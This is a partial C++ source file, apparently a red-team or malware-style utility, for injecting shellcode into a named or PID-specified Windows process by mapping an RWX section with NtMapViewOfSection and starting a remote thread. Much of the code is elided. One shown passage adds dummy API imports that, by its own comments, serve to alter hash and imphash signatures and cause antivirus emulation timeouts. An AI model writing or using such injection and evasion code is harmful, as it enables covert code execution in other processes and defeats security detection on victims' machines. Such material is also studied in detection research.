// Simple program to inject some shell code into a process, whose processname is passed to this program as argument 
// does not use writememory(), instead creates an RWX section in current process, maps a view of the section in the target process using NtMapViewOfSection
// then creates a thread in target process to execute code from that view.
#define UNICODE
#define _UNICODE
...
void Usage() {
	wprintf(L" simple_inject01.exe PID 1000 or \nsimple_inject01.exe process notepad.exe\n");
}
...
int wmain(int argc, wchar_t* argv[])
{
  ...
  // not used - just add some string here to change SHA and imphash based detections and cause emulation timeouts.
	std::vector<std::string> api_list = { "WNetAddConnection", "WNetGetConnection ", "WNetOpenEnum", "WNetEnumResource", "NetLocalGroupEnum", "NetLocalGroupGetInfo", "NetLocalGroupGetMembers", "NetUserEnum", "NetShareGetInfo", "NetShareEnum", "NetGroupEnum", "NetGroupGetInfo", "NetGroupGetUsers" };
  ...
  // import the apis in the list (not really related to the process injection code)
	for(std::vector<std::string>::iterator i = api_list.begin(); i != api_list.end(); ++i) {
		// just dummy code
		void * p = GetProcAddress(ntdll, i->c_str());
	...
	// create a section object with RWX
  ...
  // map the section object into the target process
  ...
  // create a thread in target process to execute shell code from the mapped view
